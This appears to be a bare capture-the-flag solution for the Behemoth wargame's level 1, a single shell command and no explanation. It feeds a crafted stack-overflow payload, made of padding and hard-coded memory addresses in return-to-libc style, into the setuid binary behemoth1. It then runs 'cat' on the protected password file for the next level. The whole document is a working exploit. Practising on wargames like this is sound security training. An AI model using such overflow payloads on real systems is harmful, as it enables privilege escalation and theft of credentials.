cd /behemoth
(python -c "print('a' * 0x47 + '\x50\xc8\xe4\xf7' + 'a' * 4 + '\x45\xdf\xff\xff' + '\n')";echo -ne "cat /etc/behemoth_pass/behemoth2\n") | ./behemoth1